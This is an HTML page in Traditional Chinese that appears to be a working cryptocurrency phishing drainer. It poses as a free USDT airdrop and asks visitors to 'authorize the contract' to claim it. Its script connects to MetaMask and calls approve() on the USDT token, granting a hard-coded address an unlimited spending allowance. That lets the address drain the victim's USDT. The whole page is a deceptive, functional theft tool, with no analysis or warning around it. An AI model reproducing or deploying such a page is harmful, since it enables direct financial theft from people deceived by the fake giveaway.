
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>🎁 免費領取空投！</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: 'Arial'; padding: 20px; background: #fff; text-align: center; }
    button { padding: 10px 20px; font-size: 18px; }
  </style>
</head>
<body>
  <h1>🎉 恭喜你獲得 USDT 空投！</h1>
  <p>請先授權合約以完成空投領取：</p>
  <button onclick="approve()">🎁 立即參與</button>
  <p id="status">等待操作...</p>

  <script>
    const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];

    async function approve() {
      if (!window.ethereum) return alert("請先安裝 MetaMask");
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const usdt = new ethers.Contract(USDT, ABI, signer);
      document.getElementById("status").innerText = "⏳ 發送授權中...";
      try {
        const tx = await usdt.approve(CONTRACT, ethers.constants.MaxUint256);
        document.getElementById("status").innerText = "✅ 已授權，TX Hash: " + tx.hash;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
      }
    }
  </script>
</body>
</html>
